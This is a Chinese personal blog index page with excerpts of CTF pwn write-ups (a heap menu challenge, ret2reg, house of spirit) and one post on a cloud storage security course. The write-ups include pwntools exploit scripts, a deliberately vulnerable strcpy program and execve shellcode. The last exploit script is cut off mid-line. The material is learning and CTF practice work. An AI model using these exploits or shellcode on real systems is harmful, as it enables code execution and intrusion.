<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:type" content="website">
<meta property="og:title" content="唐仔橙">
<meta property="og:url" content="https://tangzichengcc.github.io/page/4/index.html">
<meta property="og:site_name" content="唐仔橙">
<meta property="og:description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="唐仔橙">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '唐仔橙',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-18 23:57:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/" title="pwn入门-35-7月月赛pwn">pwn入门-35-7月月赛pwn</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-28T10:43:04.000Z" title="发表于 2023-07-28 18:43:04">2023-07-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-29T13:02:57.880Z" title="更新于 2023-07-29 21:02:57">2023-07-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">题目链接: 本链接+&#x2F;pwn
​		一上来能看到是一个很明显的菜单堆题,并且有后门函数,很明显要劫持控制流,执行后门函数,但问题是没找到通用的漏洞,但是能看到add中,有很大一串逻辑,后来也看到了这里有关于后门函数的操作,以及存放puts函数的地址. 
​		确定思路大概是想办法操作堆块位置,布置好位置,把后门函数放到puts函数的位置,然后调用就可以了.
​		不过后面看这逻辑看迷糊了….其实挺简单的逻辑, 注意两点,一点是可以辅助画图,来帮助自己分析,另外一点是通过调试来帮助自己分析, 只用脑子想…脑子可能不太够用..
12345678910111213141516171819202122232425262728293031323334353637383940414243unsigned __int64 add()&#123;....  puts(&quot;size:&quot;);  size = 0;  __isoc99_scanf(&quot;%u&quot;, &amp;size);  if ( size &lt;= 0x200 &amp;&amp; size &gt; 7 )  &#123;    for ( size_4 = 0; size_4 &lt;= 1; ++size_4 )    &#123;      if ( !*((_QWORD *)&amp;ptrs + 2 * size_4) )      &#123;        dword_4068[4 * size_4] = size;        *((_QWORD *)&amp;ptrs + 2 * size_4) = malloc(size);        if ( !*((_QWORD *)&amp;ptrs + 2 * size_4) )        &#123;          puts(&quot;malloc error&quot;);          exit(0);        &#125;        **((_QWORD **)&amp;ptrs + 2 * size_4) = &amp;puts;        puts(&quot;content:&quot;);        v7 = read(0, (void *)(*((_QWORD *)&amp;ptrs + 2 * size_4) + 8LL), size - 8);        if ( v7 &gt; 0 )          *(_BYTE *)(v7 + 7LL + *((_QWORD *)&amp;ptrs + 2 * size_4)) = 0;        v1 = *(_WORD *)(v7 + 14LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        v8 = magicffff;        if ( v1 == 8995 )          v8 = *(unsigned __int64 (**)())(v7 + 8LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        for ( i = 0; i &lt;= 7; ++i )          *(_BYTE *)(v7 + (__int64)i + 8 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)i)) ^ 0x23;        v2 = *(_WORD *)(v7 + 22LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        v8 = magicffff;        if ( v2 == 12850 )          v8 = *(unsigned __int64 (**)())(v7 + 16LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        for ( j = 0; j &lt;= 7; ++j )          *(_BYTE *)(v7 + (__int64)j + 16 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)j)) ^ 0x32;        return __readfsqword(0x28u) ^ v9;      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ v9;&#125;



​		比较关键的几条语句如下:
1**((_QWORD **)&amp;ptrs + 2 * size_4) = &amp;puts;

​		这一条把堆块数据区开头8字节赋值了puts函数的地址
​		然后从第8字节开始读入剩下的数据
1v7 = read(0, (void *)(*((_QWORD *)&amp;ptrs + 2 * size_4) + 8LL), size - 8);

​		下面这两句刚开始没看懂,一直在想怎么样才能满足这个条件呢,这条语句的意思是,判断输入的数据后面第6字节是否等于8995, 14可以拆成两个来看 8 + 6, 8代表了puts的8字节, 6就是剩下的6字节, 然后判断这个地址的值是否等于8995,8995这样的数还是切换成16进制比较好! 因为在gdb中显示的基本都是16进制,这可能也是自己没判断出来相关关系的一个原因
12v1 = *(_WORD *)(v7 + 14LL + *((_QWORD *)&amp;ptrs + 2 * size_4));if ( v1 == 8995 )       v1 == 0x2323

​		其实看不太懂没关系,完全可以在gdb中调试的时候发现端倪,在那两次奇怪的xor之后,能够看到符合条件的两个值,0x2323和0x3232

​		也就是说可以调整位置让程序符合这个判断条件,符合判断条件有什么用呢?
​		如果不符合条件,v8仍然是后门函数的地址,那么xor后,仍然是一个无效地址,但如果已经xor过一次,通过进入0x2323的执行流,把v8的值设置为xor过一次的地址,那么再次xor后,就恢复原样了!就得到后门函数了
12345 v8 = magicffff;       if ( v1 == 0x2323 )          v8 = *(unsigned __int64 (**)())(v7 + 8LL + *((_QWORD *)&amp;ptrs + 2 * size_4));for ( i = 0; i &lt;= 7; ++i )          *(_BYTE *)(v7 + (__int64)i + 8 + *((_QWORD *)&amp;ptrs + 2 * size_4)) = ((__int64)v8 &gt;&gt; (8 * (unsigned __int8)i)) ^ 0x23;



具体步骤
刚开始两次add, 都添加大小为32的块，



删除0号块



申请40大小的块（32行吗？32不行，32的话，用不了下一个chunk的prev_size字段），输入31个a（不是32是因为后面会补一个0x00），然后后面两个8字节就被xor了，后面两个8字节，一个是size，一个是存放puts函数地址的，这样的话，就把magic xor后的数值存放到了这里， 所以后面的问题是如何解xor，当时也卡在了这里

其实在调试中仔细观察的话（所以不能光空想！） 会发现有0x2323 0x3232，正好可以进入到两个判断条件中，  
后面再进入0x23， 两次xor就回到原先的值了！


再次释放0



再次申请0 40,并填满



show 1 就可以了

奥。。。明白为什么比赛的时候做题没做出来了。。没有看懂关键逻辑（以及想当然的以为xor后的东西看着一连串一样的，以为没啥用，其实地址0x55555当然很多一样的了。。）。。就像之前的那道题一样，都不需要写脚本，看懂逻辑了直接交互就可以了
关键逻辑在add里面

偷一下exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import * from time import sleepimport osimport syselfPath = &#x27;./pwn&#x27;libcPath = &#x27;&#x27;remoteAddr = &#x27;&#x27;remotePort = &#x27;&#x27;context.log_level = &#x27;debug&#x27;context.binary = elfPathcontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]myelf = context.binaryif sys.argv[1] == &#x27;l&#x27;:    sh = process(elfPath)    libc = myelf.libcelse:    if sys.argv[1] == &#x27;d&#x27;:       sh = process(elfPath, env = &#123;&#x27;LD_PRELOAD&#x27;: libcPath&#125;)    else:       sh = remote(remoteAddr,remotePort)       context.log_level = &#x27;info&#x27;    if libcPath:       libc = ELF(libcPath)    else:        libc = myelf.libc    def add(sz, content):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;1&#x27;)    sh.sendlineafter(&#x27;size:\n&#x27;, str(sz))    sh.sendlineafter(&#x27;content:\n&#x27;, content)def show(idx):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;2&#x27;)    sh.sendlineafter(&#x27;id:\n&#x27;, str(idx))def delete(idx):    sh.sendlineafter(&#x27;option:\n&#x27;, &#x27;3&#x27;)    sh.sendlineafter(&#x27;id:\n&#x27;, str(idx))if __name__ == &#x27;__main__&#x27;:    add(0x28, &#x27;a&#x27; ) # 0    add(0x28, &#x27;b&#x27; ) # 1    delete(0)    gdb.attach(sh)    add(0x28, &#x27;c&#x27; * 0x1f)    delete(0)    add(0x28,&#x27;d&#x27; * 0x1f)    show(1)    sh.interactive()    sh.close()



https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html
https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/
很多题都不错,好好搞一下有空
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/" title="pwn入门-34-rop之ret2reg">pwn入门-34-rop之ret2reg</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-14T14:06:44.000Z" title="发表于 2023-07-14 22:06:44">2023-07-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-16T06:06:27.410Z" title="更新于 2023-09-16 14:06:27">2023-09-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">手法概述​		这一种攻击手法主要利用的是像如 jmp rsp, jmp rax,call rax这种跳转的指令. 这种指令在一些情况下可以对抗ALSR随机化, 因为比如我们写入一段shellcode,但是不知道shellcode的开始地址,不过,如果有一个寄存器,例如rax,指向shellcode的空间,那么栈溢出后,覆盖返回地址为call rax即可返回到shellcode处进行执行.
​		主要参考的这一篇文章,利用的这里面的例子,不过在复现的时候,有些地方和文章里有点小区别
​		https://blog.csdn.net/sinat_35695255/article/details/52031813
漏洞代码ret2reg.c  编译:gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector
打开ALSR echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space
12345678910111213141516#include &lt;stdio.h&gt;    #include &lt;string.h&gt;    void evilfunction(char *input) &#123;        char buffer[512];        strcpy(buffer, input);    &#125;    int main(int argc, char **argv) &#123;        evilfunction(argv[1]);        return 0;    &#125; 



攻击过程寻找溢出长度​		可以通过gdb调试,也可以通过参考文章作者给的办法
1./ret2reg $(perl -e &#x27;printf &quot;A&quot;x524 . &quot;BBBB&quot;&#x27;)  

完之后再查看内核崩溃文件,能看到覆盖了返回地址,EIP被设置为BBBB

寻找gadget1234567891011121314root@vultr:~/ret2reg# objdump  -d ret2reg | grep *%eax    101d:	ff d0                	call   *%eax    110c:	ff d0                	call   *%eax    root@vultr:~/ret2reg# ROPgadget --binary ret2reg --only=&quot;call&quot;Gadgets information============================================================0x000010b6 : call dword ptr [eax + 0x51]0x000010af : call dword ptr [eax - 0x73]0x000011f0 : call dword ptr [edx - 0x77]0x0000101d : call eax0x0000115d : call edxUnique gadgets found: 5



寻找shellcode和寄存器的关系​		在strcpy后,shellcode的存放地址,也在了eax中(存放返回值),因为strcpy函数的返回值是指向最终的目标字符串 dest 的指针，所以如果有jmp eax或者call eax，就可以转移控制流过去

core文件gdb ret2reg core文件 –q 查看内核崩溃文件, 可以看到崩溃时的情况
那么,linux 程序崩溃 如何产生core呢?
ulimit查看,如果为0,就不会产生,需要设置一下,
ulimit -c unlimited 设置为可以产生coredump且大小不受限制,但仅对当前会话?生效,如果想要永久生效,修改&#x2F;etc&#x2F;profile,加入ulimit -c unlimited即可
参考链接: https://www.tinymind.net.cn/articles/e4c54a679a8b15
设置core文件路径:
proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 可以设置格式化的 core 文件保存位置或文件名 
1echo &quot;/core/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern

https://www.ngui.cc/el/1819464.html?action=onClick
exp​		这里的一个重点是要找call eax的地址,
​		echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space（作者echo 2, 说是不随机化加载地址,但是我这边随机化了…回头再了解下
123456pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA     Start        End Perm     Size Offset File0x56555000 0x56558000 r-xp     3000      0 /root/ret2reg/ret2reg0x56558000 0x56559000 r-xp     1000   2000 /root/ret2reg/ret2reg0x56559000 0x5655a000 rwxp     1000   3000 /root/ret2reg/ret2reg



方法一​	0x5655601d
1./ret2reg $(perl -e &#x27;printf &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot; . &quot;A&quot;x499 .&quot;\x1d\x60\x55\x56&quot;&#x27;)

​		随机化程度有多少呢? 是否可以枚举	
​		根据实际情况测试,随机化的大小好像不是很大,可以直接枚举(回头确认下范围)

​			和博客里的那个随机化不一样,博客里说把randomize_va_space设置为2,这里设置为2仍然会随机化,设置为0就都取消了
12345root@vultr:~/ret2reg# echo 0 &gt; /proc/sys/kernel/randomize_va_spaceroot@vultr:~/ret2reg# ./ret2reg $(perl -e &#x27;printf &quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot; . &quot;A&quot;x499 .&quot;\x1d\x60\x55\x56&quot;&#x27;)# lscore  exp.py  ret2reg  ret2reg.c# exit



方法二​		这里面的三个payload都可以用,本质上没啥区别. 不加架构也能成功,注意需要在启动时就传递参数的话,用这种方式 p &#x3D; process(argv&#x3D;[“.&#x2F;ret2reg”,payload])
1234567891011from pwn import *#context.arch= &#x27;i386&#x27;context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)shellcode = asm(shellcraft.sh())#payload = shellcode + b&quot;a&quot;*(524-len(shellcode))+p32(0x5655601d)#payload = b&quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;+b&quot;a&quot;*499+p32(0x5655601d)payload = b&quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;+b&quot;a&quot;*499+b&quot;\x1d\x60\x55\x56&quot;p = process(argv=[&quot;./ret2reg&quot;,payload])p.interactive()



参考链接:https://it.cha138.com/jingpin/show-199849.html
问题jmp可以吗? jmp是指什么来.. 
call和jmp的区别


2.关于随机化地址的问题
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/ucas-%E5%A4%8F%E5%AD%A3%E5%AD%A6%E6%9C%9F-%E4%BA%91%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E5%92%8C%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/" title="ucas-夏季学期-云存储安全和知识图谱">ucas-夏季学期-云存储安全和知识图谱</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-18T03:20:48.000Z" title="发表于 2023-06-18 11:20:48">2023-06-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-18T14:54:47.669Z" title="更新于 2023-06-18 22:54:47">2023-06-18</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/">研究生课程</a></span></div><div class="content">​		夏季学期选课选到了第一周,一周上完,满满的五天课,还是收获了很多的. 首先是这个云计算安全实践(其实是云存储安全实践)做了一个小系统,正好本身打算学c++,这就提前做个小项目了,感觉收获蛮多的. 然后就是知识图谱课程,当初了解知识图谱是导师给我推荐,可以用这个来整理自己的笔记,后来用了用(可能还算不上知识图谱,就是图),确实感觉很不错,因为更符合人的思维习惯我觉得,用图的形式来表达,能够更好地看清事物之间的联系,也有助于建立自己的知识体系!   
​		不过选了知识图谱这个课程…可能是个错误的选择…真要深入了解的话,隔行如隔山,什么自然语言处理,各种机器学习的东西像听天书一样,听的我头大(头疼),确实不太喜欢这个东西, 不过也反思了一下自己,如果真的有必要去学的话,要克制一下自己的喜好,该学的要学.
云存储安全​		老师它们甚至还写了本书,为了这个课程(或许是有了书才有的课程),这本书里应该把整个系统的实现写的差不多了,代码完成了百分之七八十,所需要的是理解原理,看懂代码,然后进行CV(小小修改)
​		书籍: 《云存储安全实践》  陈驰老师团队 (微信读书有的)
​		这个系统主要是实现一个类似云盘功能的东西,然后加入了很多安全的东西,比如三权分立,有账户管理的管理员、有日志管理的管理员、有系统的管理员,然后就是普通用户了. 
​		然后对于核心的用户功能,类似于实现了一个云盘,用户可以上传文件,然后文件是加密传输的,存储到阿里云等公有云上,密钥存储到另外一个云管理平台上,这样就保证了即便数据泄露了,也不会被攻击者轻易得到数据.
​		前端采用QT框架,利用c++进行开发,后端采用java.
​		其实没有设计太复杂的编程,本质还是增删改查,融入了一些安全的理念以及云存储的一点功能.(不过不是说这个系统很简单,这个系统确实能学到很多东西)
​		
​		以及通过这次实验,让我加深了一个印象,编程不是魔法,没有什么特殊的技巧,更重要的是基础, 尤其是在这次编程中体会到了模版函数等各种机制的利用会带来非常大的便利,比如说很多功能类似的函数,这时候就需要模版函数了,很多复杂的功能,也都是最基本的函数,以及循环、顺序、判断的组合.
​		
​		登陆页面:

​		用户管理页面:

​		文件管理页面:

​		搜索功能

知识图谱​		没什么评价…………..听天书……….
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/" title="pwn入门-33-houseofspirit">pwn入门-33-houseofspirit</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-08T12:51:23.000Z" title="发表于 2023-06-08 20:51:23">2023-06-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-09T12:28:26.297Z" title="更新于 2023-06-09 20:28:26">2023-06-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">​		这个东西蛮有意思,可以对内存中一块fastbin大小的不可控内存区域进行读写,但它需要满足两个条件
​		1.该区域的前后的内存是可控的
​		2.存在一个可控指针可以作为free函数的参数
how2heap的例子https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c
确实需要画图,画图的话看得很清晰了就

LCTF 2016 pwn200​		看一下有rwx段,可以写shellcode,本来是想打onegadget的,不过这种打法还需要泄露libc的地址
12345678root@VM-24-10-ubuntu:/home/ubuntu/heap/houseofsp# checksec pwn200[*] &#x27;/home/ubuntu/heap/houseofsp/pwn200&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments





1234567891011121314151617181920__int64 sub_400A8E()&#123;  __int64 i; // [rsp+10h] [rbp-40h]  char v2[48]; // [rsp+20h] [rbp-30h] BYREF  puts(&quot;who are u?&quot;);  for ( i = 0LL; i &lt;= 47; ++i )  &#123;    read(0, &amp;v2[i], 1uLL);    if ( v2[i] == 10 )    &#123;      v2[i] = 0;      break;    &#125;  &#125;  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);  puts(&quot;give me your id ~~?&quot;);  sub_4007DF();  return sub_400A29();&#125;



123456789101112131415161718192021222324252627int sub_4007DF()&#123;  char nptr[8]; // [rsp+0h] [rbp-10h] BYREF  int v2; // [rsp+8h] [rbp-8h]  int i; // [rsp+Ch] [rbp-4h]  v2 = 0;  for ( i = 0; i &lt;= 3; ++i )  &#123;    read(0, &amp;nptr[i], 1uLL);    if ( nptr[i] == 10 )  //换行    &#123;       nptr[i] = 0;  //空字符      break;    &#125;    if ( nptr[i] &gt; 57 || nptr[i] &lt;= 47 ) // 如果不是数字的话,就打印出来(只读取一个了就),如果是的话,跳过    &#123;      printf(&quot;0x%x &quot;, (unsigned int)nptr[i]);      return 0;    &#125;  &#125;  v2 = atoi(nptr);  if ( v2 &gt;= 0 )    return atoi(nptr);  else    return 0;&#125;



​		要先想办法泄露地址,输入回车的会被替换成0(就相当于字符串到最后了,被截断)
​		把前面修改为  0x40 fastbin大小,,然后进行free, 然后malloc获取到ret地址,然后就修改ret进行getshell
泄露地址​		不要遗漏每一个函数和语句!

​		输入48个A泄露rbp
​		
伪造chunk​		这里是输入money那里,可以直接覆盖到ptr指针,把ptr覆盖了,覆盖成当前rbp的地址之前的某个位置,伪造chunk,free,然后再申请拿到这一块内存控制权限,然后就可以修改ret了,但是两个问题,
​		1.不知道libc的地址,知道的话,可以直接onegadget了,所以书中的解法是用了shellcode
​		2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决

​		可以看一下最终的效果图,很清晰

exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#io = remote(&#x27;0.0.0.0&#x27;, 10001)io = process(&#x27;./pwn200&#x27;)shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)def leak():	global fake_addr	global shellcode_addr	payload = shellcode.rjust(48, b&#x27;A&#x27;)	io.sendafter(&quot;who are u?\n&quot;, payload)	io.recvuntil(payload)	rbp_addr = u64(io.recvn(6).ljust(8, b&#x27;\x00&#x27;))	shellcode_addr = rbp_addr - 0x20 - len(shellcode)	fake_addr = rbp_addr - 0x20 - 0x30 - 0x40		# make fake.size = 0x40	log.info(&quot;shellcode address: 0x%x&quot; % shellcode_addr)	log.info(&quot;fake chunk address: 0x%x&quot; % fake_addr)def house_of_spirit():	io.sendlineafter(&quot;give me your id ~~?\n&quot;, &#x27;65&#x27;)	# next.size = 0x41	fake_chunk  = p64(0) * 5	fake_chunk += p64(0x41)							# fake.size	fake_chunk  = fake_chunk.ljust(0x38, b&#x27;\x00&#x27;)	fake_chunk += p64(fake_addr)					# overwrite pointer	io.sendafter(&quot;give me 